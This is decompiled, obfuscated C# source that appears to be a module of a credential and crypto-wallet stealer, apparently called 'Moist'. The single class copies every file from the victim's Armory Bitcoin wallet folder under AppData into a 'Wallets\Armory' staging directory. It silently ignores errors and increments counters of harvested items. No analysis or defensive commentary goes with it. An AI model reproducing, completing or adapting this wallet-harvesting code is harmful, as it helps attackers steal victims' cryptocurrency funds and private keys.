using System;
using System.IO;
using Moist;

// Token: 0x02000059 RID: 89
internal class Class26
{
	// Token: 0x06000243 RID: 579 RVA: 0x00012968 File Offset: 0x00010B68
	public static void smethod_0(string string_1)
	{
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + "\\Armory\\").GetFiles())
			{
				Directory.CreateDirectory(string_1 + Class26.string_0);
				fileInfo.CopyTo(string_1 + Class26.string_0 + fileInfo.Name);
			}
			Class26.int_0++;
			Class37.int_0++;
		}
		catch
		{
		}
	}

	// Token: 0x06000244 RID: 580 RVA: 0x0000446C File Offset: 0x0000266C
	public Class26()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x06000245 RID: 581 RVA: 0x0000525A File Offset: 0x0000345A
	// Note: this type is marked as 'beforefieldinit'.
	static Class26()
	{
		Class40.gcO0h7LzslQIW();
		Class26.int_0 = 0;
		Class26.string_0 = "\\Wallets\\Armory\\";
	}

	// Token: 0x04000105 RID: 261
	public static int int_0;

	// Token: 0x04000106 RID: 262
	private static readonly string string_0;
}
